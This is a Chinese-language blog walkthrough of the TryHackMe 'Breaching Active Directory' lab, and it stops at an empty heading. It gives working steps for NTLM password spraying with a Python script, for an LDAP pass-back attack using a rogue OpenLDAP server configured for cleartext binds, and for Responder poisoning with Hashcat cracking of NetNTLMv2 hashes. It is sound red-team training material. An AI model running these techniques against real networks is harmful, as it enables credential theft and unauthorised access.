<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>THM-入侵AD | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>THM-入侵AD</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-02-09T07:48:16.949Z" id="date"> 2024-02-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-03-05T10:33:33.118Z" id="updated"> 2024-03-05</time></div></span><br><span>Word Count: <div class="control">9.4k</div></span><br><span>Read Time: <div class="control">34 min</div></span></div></div><hr><div id="post-content"><h1>0x01 简介</h1>
<p>大约 90% 的全球财富 1000 强公司使用 Active Directory (AD)。如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。然而，由于AD用于整个产业的身份和访问管理，它掌握着王国的钥匙，使其很可能成为攻击者的目标。</p>
<h2 id="Breaching-Active-Directory"><a href="#Breaching-Active-Directory" class="headerlink" title="Breaching-Active-Directory"></a>Breaching Active Directory</h2>
<p>在我们利用 AD 错误配置进行权限提升、横向移动和目标执行之前，您首先需要初始访问权限。您需要获取一组初始的有效 AD 凭据。由于 AD 服务和功能的数量众多，获取一组初始 AD 凭据的攻击面通常很大。在这个房间里，我们将讨论几种途径，但这绝不是详尽的列表。</p>
<p>在查找第一组凭据时，我们不会关注与帐户关联的权限；而是关注与帐户相关的权限。因此，即使是低权限帐户也足够了。我们只是在寻找一种对 AD 进行身份验证的方法，使我们能够对 AD 本身进行进一步的枚举。</p>
<h2 id="Learning-Objectives"><a href="#Learning-Objectives" class="headerlink" title="Learning-Objectives"></a>Learning Objectives</h2>
<p>在这个网络中，我们将介绍几种可用于入侵 AD 的方法。这绝不是完整的列表，因为每天都会发现新的方法和技术。但是，我们将介绍以下技术来恢复此网络中的 AD 凭据：</p>
<ul>
<li>NTLM 认证服务</li>
<li>LDAP 绑定凭证</li>
<li>Authentication Relays 认证中继</li>
<li>微软部署工具包</li>
<li>Configuration Files 配置文件</li>
</ul>
<p>我们可以通过针对面向互联网的组织的系统或通过在组织的网络上植入恶意设备来使用这些技术进行安全评估。</p>
<h1>0x02 OSINT 和网络钓鱼</h1>
<p>获取第一组 AD 凭据的两种流行方法是开源情报 (OSINT) 和网络钓鱼。我们在这里仅简单提及这两种方法，因为它们已经在其他房间中进行了更深入的介绍。</p>
<h2 id="OSINT-开源情报"><a href="#OSINT-开源情报" class="headerlink" title="OSINT-开源情报"></a><strong>OSINT 开源情报</strong></h2>
<p>OSINT 用于发现已公开披露的信息。就 AD 凭据而言，发生这种情况的原因有多种，例如：</p>
<ul>
<li>在 Stack Overflow 等公共论坛上提问但在问题中披露敏感信息（例如凭据）的用户。</li>
<li>使用硬编码凭据将脚本上传到 Github 等服务的开发人员。</li>
<li>由于员工使用其工作帐户注册其他外部网站，因此在过去的违规行为中，凭证被泄露。 HaveIBeenPwned 和 DeHashed 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露事件。</li>
</ul>
<p>通过使用 OSINT 技术，有可能恢复公开披露的凭据。如果我们足够幸运找到凭证，我们仍然需要找到一种方法来测试它们是否有效，因为 OSINT 信息可能会过时。在任务 3 中，我们将讨论 NTLM 身份验证服务，它可能提供一个极好的途径来测试凭据以查看它们是否仍然有效。</p>
<p>A detailed room on Red Team OSINT can be found <a target="_blank" rel="noopener" href="https://tryhackme.com/jr/redteamrecon">here.</a><br>
可以在此处找到有关红队 OSINT 的详细房间。</p>
<h2 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a><strong>Phishing</strong></h2>
<p>网络钓鱼是另一种破坏 AD 的绝佳方法。网络钓鱼通常会诱使用户在恶意网页上提供凭据，或要求他们运行特定的应用程序，该应用程序会在后台安装远程访问特洛伊木马 (RAT)。这是一种流行的方法，因为 RAT 会在用户的上下文中执行，从而立即允许您模拟该用户的 AD 帐户。这就是为什么网络钓鱼对于红队和蓝队来说都是一个大话题。</p>
<p>A detailed room on phishing can be found <a target="_blank" rel="noopener" href="https://tryhackme.com/module/phishing">here.</a><br>
可以在此处找到有关网络钓鱼的详细信息。</p>
<h1>0x03 NTLM 验证服务</h1>
<h2 id="NTLM-and-NetNTLM"><a href="#NTLM-and-NetNTLM" class="headerlink" title="NTLM-and-NetNTLM"></a>NTLM and NetNTLM</h2>
<p>新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。这种身份验证机制被网络上的服务大量使用。但是，使用 NetNTLM 的服务也可以暴露在互联网上。以下是一些流行的例子：</p>
<ul>
<li>公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。</li>
<li>暴露于互联网的服务器的远程桌面协议（RDP）服务。</li>
<li>与 AD 集成的公开 VPN 端点。</li>
<li>面向互联网并使用 NetNTLM 的 Web 应用程序。</li>
</ul>
<p>NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p>
<p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储 AD 凭据，该凭据应仅存储在域控制器上。这个过程如下图所示：</p>
<p class='item-img' data-src='https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png'><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p>
<h2 id="暴力登录攻击"><a href="#暴力登录攻击" class="headerlink" title="暴力登录攻击"></a>暴力登录攻击</h2>
<p>如任务 2 中所述，这些公开的服务提供了一个极好的位置来测试使用其他方式发现的凭据。但是，也可以直接使用这些服务来尝试恢复一组初始的有效 AD 凭据。如果我们在最初的红队侦察期间恢复了有效电子邮件地址等信息，我们也许可以尝试使用它们进行暴力攻击。</p>
<p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。</p>
<p>您已获得在红队 OSINT 练习中发现的用户名列表。 OSINT 活动还显示了该组织的初始入职密码，似乎是“Changeme123”。尽管用户应始终更改其初始密码，但我们知道用户经常忘记。我们将使用定制开发的脚本对托管在以下 URL 的 Web 应用程序进行密码喷射：<a target="_blank" rel="noopener" href="http://ntlmauth.za.tryhackme.com">http://ntlmauth.za.tryhackme.com</a>。</p>
<p>导航到 URL，我们可以看到它提示我们输入 Windows 身份验证凭据：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305174537811.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305174537811.png" alt="image-20240305174537811"></p>
<p>注意：Firefox 的 Windows 身份验证插件非常容易失败。如果您想手动测试凭据，建议使用 Chrome。</p>
<p>我们可以使用 Hydra 等工具来协助密码喷射攻击。然而，通常最好自己编写这些类型的攻击脚本，这样您就可以更好地控制该过程。任务文件中提供了一个基本的Python脚本，可用于密码喷射攻击。以下函数是脚本的主要组成部分：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password_spray</span>(<span class="hljs-params">self, password, url</span>):<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[*] Starting passwords spray attack using the following password: &quot;</span> + password)<br>    <span class="hljs-comment">#Reset valid credential counter</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#Iterate through all of the possible usernames</span><br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> self.users:<br>        <span class="hljs-comment">#Make a request to the website and attempt Windows Authentication</span><br>        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + <span class="hljs-string">&quot;\\&quot;</span> + user, password))<br>        <span class="hljs-comment">#Read status code of response to determine if authentication was successful</span><br>        <span class="hljs-keyword">if</span> (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[+] Valid credential pair found! Username: &quot;</span> + user + <span class="hljs-string">&quot; Password: &quot;</span> + password)<br>            count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (self.verbose):<br>            <span class="hljs-keyword">if</span> (response.status_code == self.HTTP_AUTH_FAILED_CODE):<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[-] Failed login with Username: &quot;</span> + user)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[*] Password spray attack completed, &quot;</span> + <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&quot; valid credential pairs found&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>此函数将我们建议的密码和我们定位的 URL 作为输入，并尝试使用文本文件中的每个用户名对 URL 进行身份验证。通过监控应用程序的 HTTP 响应代码的差异，我们可以确定凭证对是否有效。如果凭证对有效，应用程序将使用 200 HTTP (OK) 代码进行响应。如果该对无效，应用程序将返回 401 HTTP（未经授权）代码。</p>
<p>按照提示我们运行py脚本：如下图，共发现四个有效凭据</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209163921440.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209163921440.png" alt="image-20240209163921440"></p>
<h1>0x04 LDAP 绑定凭证</h1>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2>
<p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。</p>
<p>LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。其中包括应用程序和系统，例如：</p>
<ul>
<li>
<p>Gitlab</p>
</li>
<li>
<p>Jenkins</p>
</li>
<li>
<p>Custom-developed web applications</p>
</li>
<li>
<p>Printers</p>
</li>
<li>
<p>VPNs</p>
</li>
</ul>
<p>如果这些应用程序或服务中的任何一个在互联网上暴露，那么可以使用与针对 NTLM 认证系统使用的相同类型的攻击。但是，由于使用 LDAP 认证的服务需要一组 AD 凭据，因此它会打开额外的攻击途径。本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的认证访问权限。通过 LDAP 进行身份验证的过程如下所示：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164355943.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164355943.png" alt="image-20240209164355943"></p>
<p>如果您可以在正确的主机（例如 Gitlab 服务器）上站稳脚跟，那么恢复这些 AD 凭据可能就像读取配置文件一样简单。这些凭证通常以纯文本形式存储在配置文件中，因为安全模型依赖于保持位置和存储配置文件的安全而不是其内容的安全。任务 7 中更深入地介绍了配置文件。</p>
<h2 id="LDAP-回传攻击"><a href="#LDAP-回传攻击" class="headerlink" title="LDAP-回传攻击"></a>LDAP 回传攻击</h2>
<p>然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。</p>
<p>当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 <code>admin:admin</code> 或 <code>admin:password</code> 。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p>
<h2 id="执行-LDAP-回传"><a href="#执行-LDAP-回传" class="headerlink" title="执行-LDAP-回传"></a>执行 LDAP 回传</h2>
<p>该网络中有一台网络打印机，管理网站甚至不需要凭据。导航至 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 以查找打印机的设置页面：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164722096.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164722096.png" alt="image-20240209164722096"></p>
<p>使用浏览器检查，我们还可以验证打印机网站是否至少足够安全，而不仅仅是将 LDAP 密码发送回浏览器：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164807332.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209164807332.png" alt="image-20240209164807332"></p>
<p>所以我们有用户名，但没有密码。但是，当我们按测试设置时，我们可以看到向域控制器发出身份验证请求以测试 LDAP 凭据。让我们尝试利用此漏洞让打印机连接到我们，这会泄露凭据。为此，我们使用一个简单的 Netcat 侦听器来测试是否可以让打印机连接到我们。由于LDAP的默认端口是389，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">nc -lvp <span class="hljs-number">389</span><br></code></pre></td></tr></table></figure>
<p>您应该看到我们恢复了连接，但有一个小问题：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165125276.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165125276.png" alt="image-20240209165125276"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165131025.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209165131025.png" alt="image-20240209165131025"></p>
<p>您可能需要多次尝试才能接收回连接，但它应该会在 5 秒内做出响应。 <code>supportedCapabilities</code> 响应告诉我们遇到了问题。本质上，在打印机发送凭据之前，它会尝试协商 LDAP 身份验证方法详细信息。它将使用此协商来选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法太安全，则凭据将不会以明文形式传输。对于某些身份验证方法，凭据根本不会通过网络传输！所以我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个恶意 LDAP 服务器并对其进行不安全的配置，以确保凭证以明文形式发送。</p>
<h2 id="托管恶意-LDAP-服务器"><a href="#托管恶意-LDAP-服务器" class="headerlink" title="托管恶意-LDAP-服务器"></a>托管恶意 LDAP 服务器</h2>
<p>有多种方法可以托管恶意 LDAP 服务器，但我们将在本示例中使用 OpenLDAP。如果您使用 AttackBox，则已经为您安装了 OpenLDAP。但是，如果您使用自己的攻击机器，则需要使用以下命令安装 OpenLDAP：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd<br></code></pre></td></tr></table></figure>
<p>然而，您还必须在 攻击机 上配置您自己的恶意 LDAP 服务器。我们将首先使用以下命令重新配置 LDAP 服务器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">dpkg-reconfigure -<span class="hljs-selector-tag">p</span> low slapd<br></code></pre></td></tr></table></figure>
<p>如果您想跳过服务器配置，请确保在请求时按&lt;否&gt;，具体配置参考：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/breachingad">https://tryhackme.com/room/breachingad</a></p>
<p>在使用恶意 LDAP 服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，并使用以下内容进行调用：</p>
<p><strong>olcSaslSecProps.ldif</strong></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">dn: cn=config<br>replace: olcSaslSecProps<br>olcSaslSecProps: noanonymous,minssf=<span class="hljs-number">0</span>,passcred<br></code></pre></td></tr></table></figure>
<p>该文件具有以下属性：</p>
<ul>
<li>olcSaslSecProps：指定 SASL 安全属性</li>
<li>noanonymous：禁用支持匿名登录的机制</li>
<li>minssf：指定可接受的最小安全强度，0表示无保护。</li>
</ul>
<p>现在我们可以使用 ldif 文件来修补我们的 LDAP 服务器，方法如下：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart<br></code></pre></td></tr></table></figure>
<p>我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（注意：如果您使用 Kali，您可能不会收到任何输出，但配置应该已生效，您可以继续执行后续步骤）：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170327073.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170327073.png" alt="image-20240209170327073"></p>
<h2 id="捕获-LDAP-凭证"><a href="#捕获-LDAP-凭证" class="headerlink" title="捕获-LDAP-凭证"></a>捕获 LDAP 凭证</h2>
<p>我们的恶意 LDAP 服务器现已配置完毕。当我们单击 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 上的“测试设置”时，身份验证将以明文形式进行。如果您正确配置了恶意 LDAP 服务器并且它正在降级通信，您将收到以下错误：“此专有名称包含无效语法”。如果收到此错误，您可以使用以下命令使用 tcpdump 来捕获凭据：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170441332.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170441332.png" alt="image-20240209170441332"></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">tcpdump -SX -<span class="hljs-selector-tag">i</span> breachad tcp port <span class="hljs-number">389</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170526851.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209170526851.png" alt="image-20240209170526851"></p>
<p>另请注意， <code>password11</code> 是一个示例。您的服务密码将会不同。在 TCPdump 返回数据之前，您可能需要按几次“测试设置”按钮，因为我们是通过 VPN 连接执行攻击。</p>
<p>现在我们有了另一组有效的 AD 凭据！通过使用 LDAP 回传攻击并降级支持的身份验证机制，我们可以拦截明文形式的凭据。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171228546.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171228546.png" alt="image-20240209171228546"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171236900.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209171236900.png" alt="image-20240209171236900"></p>
<h1>0x05 身份验证中继</h1>
<p>继续讨论可以从我们的恶意设备发起的攻击，我们现在将研究针对更广泛的网络身份验证协议的攻击。在Windows网络中，有大量的服务相互通信，允许用户利用网络提供的服务。</p>
<p>这些服务必须使用内置的身份验证方法来验证传入连接的身份。在任务 2 中，我们探索了 Web 应用程序上使用的 NTLM 身份验证。在此任务中，我们将更深入地了解从网络角度来看此身份验证的情况。但是，对于此任务，我们将重点关注 SMB 使用的 NetNTLM 身份验证。</p>
<h2 id="服务器消息块"><a href="#服务器消息块" class="headerlink" title="服务器消息块"></a>服务器消息块</h2>
<p>服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。</p>
<p>然而，早期版本的SMB协议安全性被认为是不足的。发现了几个漏洞和利用方式，可以利用它们来恢复凭据，甚至在设备上获得代码执行。尽管这些漏洞中的一些已在协议的更新版本中得到解决，但通常组织并不强制使用更新版本，因为旧系统不支持它们。我们将研究两种不同的利用方式，用于SMB的NetNTLM身份验证：</p>
<ul>
<li>由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。然而，这种破解过程比直接破解 NTLM 哈希要慢得多。</li>
<li>我们可以使用我们的恶意设备进行中间人攻击，中继客户端和服务器之间的SMB身份验证，这将为我们提供一个活动的已验证会话和对目标服务器的访问。</li>
</ul>
<h2 id="LLMNR-NBT-NS-and-WPAD"><a href="#LLMNR-NBT-NS-and-WPAD" class="headerlink" title="LLMNR-NBT-NS-and-WPAD"></a>LLMNR, NBT-NS, and WPAD</h2>
<p>在此任务中，我们将稍微了解一下使用 SMB 期间发生的身份验证。我们将使用 Responder 尝试拦截 NetNTLM 挑战来破解它。网络上通常有很多这样的挑战。一些安全解决方案甚至扫描整个 IP 范围以从主机恢复信息。有时，由于 DNS 记录过时，这些身份验证挑战最终可能会攻击您的恶意设备而不是目标主机。</p>
<p>Responder 允许我们通过在 NetNTLM 身份验证期间毒害响应来执行中间人攻击，欺骗客户端与您而不是他们想要连接的实际服务器进行对话。在真实 LAN 上，响应程序将尝试毒害检测到的任何链路本地多播名称解析 (LLMNR)、NetBIOS 名称服务 (NBT-NS) 和 Web 代理自动发现 (WPAD) 请求。在大型 Windows 网络上，这些协议允许主机为同一本地网络上的所有主机执行自己的本地 DNS 解析。主机可以首先尝试通过发送 LLMNR 请求并查看是否有主机响应来确定它们正在查找的主机是否位于同一本地网络上，而不是使 DNS 服务器等网络资源负担过重。 NBT-NS 是 LLMNR 的先驱协议，发出 WPAD 请求是为了尝试为未来的 HTTP(s) 连接找到代理。</p>
<p>由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。</p>
<h2 id="拦截-NetNTLM-挑战"><a href="#拦截-NetNTLM-挑战" class="headerlink" title="拦截-NetNTLM-挑战"></a>拦截 NetNTLM 挑战</h2>
<p>需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。这意味着响应程序通常仅限于本地网络上的中毒身份验证质询。由于我们通过 VPN 连接到网络，因此我们只能破坏该 VPN 网络上发生的身份验证质询。为此，我们模拟了一个可能中毒的身份验证请求，每 30 分钟运行一次。这意味着您可能需要等待一段时间才能拦截 NetNTLM 质询和响应。</p>
<p>尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性并因此被检测到至关重要。通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享。在安全评估中使用 Responder 时请记住这一点。</p>
<p>Responder 已安装在 AttackBox 上。但是，如果您不使用 AttackBox，则可以从此存储库下载并安装它：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder%E3%80%82%E6%88%91%E4%BB%AC%E5%B0%86%E8%AE%BE%E7%BD%AE">https://github.com/lgandx/Responder。我们将设置</a> Responder 在连接到 VPN 的接口上运行：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">responder -<span class="hljs-selector-tag">I</span> breachad<br></code></pre></td></tr></table></figure>
<p>如果您使用 AttackBox，则并非所有响应程序服务都能够启动，因为其他服务已在使用这些端口。但是，这不会影响此任务。 Responder 现在将侦听任何传入的 LLMNR、NBT-NS 或 WPAD 请求。我们会让 Responder 在真实 LAN 上运行一段时间。然而，在我们的例子中，我们必须通过让其中一台服务器尝试对 VPN 上的计算机进行身份验证来模拟这种中毒。让 Responder 运行一段时间（平均 10 分钟，呼吸一下新鲜空气！），您应该会收到一个 SMBv2 连接，Responder 可以使用该连接来吸引和提取 NTLMv2-SSP 响应。它看起来像这样：</p>
<h2 id="NTLM-密码喷射攻击"><a href="#NTLM-密码喷射攻击" class="headerlink" title="NTLM-密码喷射攻击"></a>NTLM 密码喷射攻击</h2>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[+]</span> Listening for events...<br><span class="hljs-selector-attr">[SMBv2]</span> NTLMv2-SSP Client   : &lt;Client IP&gt;<br>[SMBv2] NTLMv2-SSP Username : ZA\&lt;Service Account Username&gt;<br>[SMBv2] NTLMv2-SSP Hash     : &lt;Service Account Username&gt;::ZA:&lt;NTLMv2-SSP Hash&gt;<br></code></pre></td></tr></table></figure>
<p>如果我们使用恶意设备，我们可能会运行 Responder 相当长的时间，捕获多个响应。一旦我们有了几个，我们就可以开始对响应执行一些离线破解，希望恢复它们关联的 NTLM 密码。如果账户配置了弱密码，我们就有很大的机会成功破解它们。将 NTLMv2-SSP 哈希复制到文本文件。然后，我们将使用可下载文件中提供的密码列表来执行此任务，并使用 Hashcat 尝试使用以下命令破解哈希：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">hashcat -m <span class="hljs-number">5600</span> &lt;hash file&gt; &lt;password file&gt; <span class="hljs-attr">--force</span><br></code></pre></td></tr></table></figure>
<p>密码文件已在 AttackBox 的 <code>/root/Rooms/BreachingAD/task5/</code> 目录中或作为可下载的任务文件提供给您。我们使用 hashtype 5600，它与 hashcat 的 NTLMv2-SSP 相对应。如果您使用自己的机器，则必须先安装 Hashcat。</p>
<p>我们可以破解的任何哈希现在都将为我们提供用于违规的 AD 凭据！</p>
<h2 id="传递挑战"><a href="#传递挑战" class="headerlink" title="传递挑战"></a>传递挑战</h2>
